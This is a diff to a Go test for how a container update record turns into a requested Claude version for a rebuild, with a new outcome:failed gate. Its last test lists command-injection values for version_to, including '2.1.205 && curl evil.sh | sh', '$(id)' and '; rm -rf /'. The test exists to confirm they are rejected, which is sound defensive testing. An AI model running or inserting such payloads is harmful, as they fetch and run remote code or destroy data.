@@ -48,16 +48,29 @@ func TestRequestedClaudeVersion(t *testing.T) {
 
 	t.Run("missing version_to", func(t *testing.T) {
 		s, _ := newStore(t, "work")
-		writeUpdateResult(t, s.UpdateResultPath("work"), `{"outcome":"success"}`)
+		writeUpdateResult(t, s.UpdateResultPath("work"), `{"outcome":"failed"}`)
 
 		v, err := s.RequestedClaudeVersion("work")
 		require.NoError(t, err)
 		require.Empty(t, v)
 	})
 
+	// The signal is "the container tried and could not". A successful record —
+	// e.g. the host's own, copied in by `--from ~/.claude` — must not trigger a
+	// rebuild, even when it names a newer version.
+	t.Run("successful update record is ignored", func(t *testing.T) {
+		s, _ := newStore(t, "work")
+		writeUpdateResult(t, s.UpdateResultPath("work"),
+			`{"outcome":"success","version_from":"2.1.204","version_to":"2.1.205"}`)
+
+		v, err := s.RequestedClaudeVersion("work")
+		require.NoError(t, err)
+		require.Empty(t, v, "only a failed in-container update is a request to rebuild")
+	})
+
 	t.Run("dist-tag is not a pin", func(t *testing.T) {
 		s, _ := newStore(t, "work")
-		writeUpdateResult(t, s.UpdateResultPath("work"), `{"version_to":"latest"}`)
+		writeUpdateResult(t, s.UpdateResultPath("work"), `{"outcome":"failed","version_to":"latest"}`)
 
 		v, err := s.RequestedClaudeVersion("work")
 		require.NoError(t, err)
@@ -66,11 +79,12 @@ func TestRequestedClaudeVersion(t *testing.T) {
 
 	// The container can write this file. A hostile version_to must never become
 	// a build arg; it is ignored rather than fatal, since ccc does not own it.
+	// outcome:failed here so the rejection is by the value, not the outcome gate.
 	t.Run("hostile version_to is ignored", func(t *testing.T) {
 		for _, bad := range []string{
-			`{"version_to":"2.1.205 && curl evil.sh | sh"}`,
-			`{"version_to":"$(id)"}`,
-			`{"version_to":"2.1.205; rm -rf /"}`,
+			`{"outcome":"failed","version_to":"2.1.205 && curl evil.sh | sh"}`,
+			`{"outcome":"failed","version_to":"$(id)"}`,
+			`{"outcome":"failed","version_to":"2.1.205; rm -rf /"}`,
 		} {
 			s, _ := newStore(t, "work")
 			writeUpdateResult(t, s.UpdateResultPath("work"), bad)
